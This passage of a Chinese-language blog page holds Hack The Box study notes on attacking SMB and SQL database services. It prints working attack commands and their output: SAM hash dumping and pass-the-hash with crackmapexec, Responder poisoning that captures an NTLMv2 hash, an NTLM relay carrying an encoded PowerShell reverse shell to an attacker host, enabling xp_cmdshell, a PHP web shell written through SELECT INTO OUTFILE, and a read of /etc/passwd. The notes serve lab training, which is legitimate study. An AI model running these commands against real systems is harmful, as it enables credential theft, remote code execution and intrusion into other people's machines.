+<h4 id="Extract-Hashes-from-SAM-Database"><a href="#Extract-Hashes-from-SAM-Database" class="headerlink" title="Extract Hashes from SAM Database"></a>Extract Hashes from SAM Database</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam
+</code></pre>
+<h4 id="Pass-the-Hash-PtH"><a href="#Pass-the-Hash-PtH" class="headerlink" title="Pass-the-Hash (PtH)"></a>Pass-the-Hash (PtH)</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
+</code></pre>
+<h4 id="Forced-Authentication-Attacks"><a href="#Forced-Authentication-Attacks" class="headerlink" title="Forced Authentication Attacks"></a>Forced Authentication Attacks</h4><p>我们还可以通过创建假SMB服务器来捕获用户的NetNTLM v1&#x2F;v2哈希，从而滥用SMB协议。 执行此类操作的最常见工具是Responder。Responder是一种LLMNR、NBT-NS和MDNS投毒器工具，具有不同的功能，其中之一是可以设置虚假服务，包括SMB，以窃取NetNTLM v1&#x2F;v2哈希。在其默认配置中，它将查找LLMNR和NBT-NS流量。然后，它将代表受害者正在寻找的服务器进行响应，并捕获他们的NetNTLM哈希。 让我们举例说明Responder是如何工作的。想象一下，我们使用响应程序默认配置创建了一个假的SMB服务器，并使用以下命令：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ responder -I &lt;interface name&gt;
+</code></pre>
+<p>假设用户错误地键入了共享文件夹的名称\mysharefoder\，而不是\mysharedfolder\。在这种情况下，所有名称解析都将失败，因为名称不存在，并且机器将向网络上的所有设备发送多播查询，包括我们运行的假冒SMB服务器。这是一个问题，因为没有采取任何措施来验证答复的完整性。攻击者可以通过监听此类查询和欺骗响应来利用这一机制，使受害者相信恶意服务器是可信的。这种信任通常用于窃取凭据。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sudo responder -I ens33
+
+                                         __               
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|              
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0
+               
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:                
+    LLMNR                      [ON]
+    NBT-NS                     [ON]        
+    DNS/MDNS                   [ON]   
+                                                                                                                                                                                          
+[+] Servers:         
+    HTTP server                [ON]                                   
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]                                  
+    Auth proxy                 [OFF]
+    SMB server                 [ON]                                   
+    Kerberos server            [ON]                                   
+    SQL server                 [ON]                                   
+    FTP server                 [ON]                                   
+    IMAP server                [ON]                                   
+    POP3 server                [ON]                                   
+    SMTP server                [ON]                                   
+    DNS server                 [ON]                                   
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]                                   
+                                                                                   
+[+] HTTP Options:                                                                  
+    Always serving EXE         [OFF]                                               
+    Serving EXE                [OFF]                                               
+    Serving HTML               [OFF]                                               
+    Upstream Proxy             [OFF]                                               
+
+[+] Poisoning Options:                                                             
+    Analyze Mode               [OFF]                                               
+    Force WPAD auth            [OFF]                                               
+    Force Basic Auth           [OFF]                                               
+    Force LM downgrade         [OFF]                                               
+    Fingerprint hosts          [OFF]                                               
+
+[+] Generic Options:                                                               
+    Responder NIC              [tun0]                                              
+    Responder IP               [10.10.14.198]                                      
+    Challenge set              [random]                                            
+    Don&#39;t Respond To Names     [&#39;ISATAP&#39;]                                          
+
+[+] Current Session Variables:                                                     
+    Responder Machine Name     [WIN-2TY1Z1CIGXH]   
+    Responder Domain Name      [HF2L.LOCAL]                                        
+    Responder DCE-RPC Port     [48162] 
+
+[+] Listening for events... 
+
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
+[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
+[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
+[SMB] NTLMv2-SSP Client   : 10.10.110.17
+[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
+[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
+</code></pre>
+<p>已破解NTLMv2哈希。密码是P@ssword.如果我们无法破解哈希，我们可以使用impacket ntlmrelayx或Responder MultiRelay.py将捕获的哈希中继到另一台机器。让我们看看使用impacket-ntlmrelay的示例。</p>
+<p>首先，我们需要在响应程序配置文件（&#x2F;etc&#x2F;responser&#x2F;responder.conf）中将SMB设置为OFF。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/responder/Responder.conf | grep &#39;SMB =&#39;
+
+SMB = Off
+</code></pre>
+<p>然后，我们使用选项–no http server、-sb2support执行impacket-ntlmrelayx，并使用选项-t执行目标机器。默认情况下，impacket-ntlmrelayx将转储SAM数据库，但我们可以通过添加选项-c来执行命令。</p>
+<p>我们可以使用创建PowerShell反向shell<a target="_blank" rel="noopener" href="https://www.revshells.com/%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%BA%E5%99%A8IP%E5%9C%B0%E5%9D%80%E3%80%81%E7%AB%AF%E5%8F%A3%E5%92%8C%E9%80%89%E9%A1%B9Powershell#3%EF%BC%88Base64%EF%BC%89%E3%80%82">https://www.revshells.com/，设置我们的机器IP地址、端口和选项Powershell#3（Base64）。</a></p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;
+</code></pre>
+<h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote>
+<p>具有读取权限的共享文件夹的名称是什么？</p>
+<p>用户名“jason”的密码是什么？</p>
+<p>通过SSH以用户“jason”身份登录并找到标志.txt文件。提交内容作为您的答案。</p>
+</blockquote>
+<p>使用smbmap：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111559845.png" alt="image-20230811155958797"></p>
+<p>根据给出的用户名爆破一下密码：</p>
+<pre><code>crackmapexec smb 10.129.203.6 -u jason -p passwords.list --local-auth 
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111612302.png" alt="image-20230811161236259"></p>
+<p>这里使用ssh链接但是失败了，尝试使用rce</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308111624866.png" alt="image-20230811162433821"></p>
+<p>impact没有写权限，无语</p>
+<h1 id="Attacking-SQL-Databases"><a href="#Attacking-SQL-Databases" class="headerlink" title="Attacking SQL Databases"></a>Attacking SQL Databases</h1><p>默认情况下，MSSQL使用端口TCP&#x2F;1433和UDP&#x2F;1434，MySQL使用TCP&#x2F;3306。但是，当MSSQL在“隐藏”模式下运行时，它使用TCP&#x2F;2433端口。我们可以使用Nmap的默认脚本-sC选项来枚举目标系统上的数据库服务</p>
+<h4 id="MySQL-Connecting-to-the-SQL-Server"><a href="#MySQL-Connecting-to-the-SQL-Server" class="headerlink" title="MySQL - Connecting to the SQL Server"></a>MySQL - Connecting to the SQL Server</h4><pre><code class="shell-session">Tanin@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+</code></pre>
+<h4 id="Sqlcmd-Connecting-to-the-SQL-Server"><a href="#Sqlcmd-Connecting-to-the-SQL-Server" class="headerlink" title="Sqlcmd - Connecting to the SQL Server"></a>Sqlcmd - Connecting to the SQL Server</h4><pre><code class="cmd-session">C:\htb&gt; sqlcmd -S SRVMSSQL -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30
+</code></pre>
+<p>注意：当我们使用sqlcmd向MSSQL进行身份验证时，我们可以使用参数-y（SQLCMDMAXVARTYPEWIDTH）和-y（SQLCMDMAXFIXEDTYPEWIDTH）来获得更好的输出。请记住，这可能会影响性能。</p>
+<p>如果我们的目标是来自Linux的MSSQL，我们可以使用sqsh作为sqlcmd的替代方案：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h
+
+sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
+Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
+This is free software with ABSOLUTELY NO WARRANTY
+For more information type &#39;\warranty&#39;
+1&gt;
+</code></pre>
+<p>或者，我们可以使用Impacket中名为mssqlclient.py的工具。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
+</code></pre>
+<h2 id="Execute-Commands"><a href="#Execute-Commands" class="headerlink" title="Execute Commands"></a>Execute Commands</h2><p>在攻击公共服务时，命令执行是最需要的功能之一，因为它允许我们控制操作系统。如果我们有适当的权限，我们可以使用SQL数据库执行系统命令或创建必要的元素来执行。</p>
+<p>MSSQL有一个名为xp_cmdshell的扩展存储过程，它允许我们使用SQL执行系统命令。请记住以下关于xp_cmdshell的内容： xpcmdshell是一个强大的功能，默认情况下是禁用的。xp_cmdshell可以通过使用基于策略的管理或执行sp_configure来启用和禁用 xp_cmdshell派生的Windows进程与SQL Server服务帐户具有相同的安全权限 xp_cmdshell同步运行。在命令shell命令完成之前，控件不会返回给调用方 要在MSSQL上使用SQL语法执行命令，请使用：</p>
+<pre><code class="cmd-session">1&gt; xp_cmdshell &#39;whoami&#39;
+2&gt; GO
+</code></pre>
+<p>如果没有启用xp_cmdshell，如果我们有适当的权限，我们可以使用以下命令启用它：</p>
+<pre><code class="mssql">-- To allow advanced options to be changed.  
+EXECUTE sp_configure &#39;show advanced options&#39;, 1
+GO
+
+-- To update the currently configured value for advanced options.  
+RECONFIGURE
+GO  
+
+-- To enable the feature.  
+EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1
+GO  
+
+-- To update the currently configured value for this feature.  
+RECONFIGURE
+GO
+</code></pre>
+<p>MySQL支持用户定义函数，这允许我们在SQL中作为函数执行C&#x2F;C++代码，在这个GitHub存储库 <a target="_blank" rel="noopener" href="https://github.com/mysqludf/lib_mysqludf_sys">GitHub repository</a>中有一个用于命令执行的用户定义函数。在生产环境中遇到这样的用户定义函数并不常见，但我们应该意识到，我们可能能够使用它</p>
+<h2 id="Write-Local-Files"><a href="#Write-Local-Files" class="headerlink" title="Write Local Files"></a>Write Local Files</h2><p>如果我们有适当的权限，我们可以尝试在web服务器目录中使用SELECT INTO OUTFILE编写文件。然后我们可以浏览到文件所在的位置并执行我们的命令。</p>
+<pre><code class="shell-session">mysql&gt; SELECT &quot;&lt;?php echo shell_exec($_GET[&#39;c&#39;]);?&gt;&quot; INTO OUTFILE &#39;/var/www/html/webshell.php&#39;;
+
+Query OK, 1 row affected (0.001 sec)
+</code></pre>
+<p>在MySQL中，全局系统变量secure_file_priv限制了数据导入和导出操作的效果，例如由LOAD data和SELECT…INTO OUTFILE语句以及LOAD_file（）函数执行的操作。这些操作只允许具有FILE权限的用户执行。</p>
+<pre><code class="shell-session">mysql&gt; show variables like &quot;secure_file_priv&quot;;
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+</code></pre>
+<p>如果secure_file_priv变量为空，这意味着我们可以使用MySQL读取和写入数据</p>
+<h4 id="MySQL-Read-Local-Files-in-MySQL"><a href="#MySQL-Read-Local-Files-in-MySQL" class="headerlink" title="MySQL - Read Local Files in MySQL"></a>MySQL - Read Local Files in MySQL</h4><pre><code class="shell-session">mysql&gt; select LOAD_FILE(&quot;/etc/passwd&quot;);
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
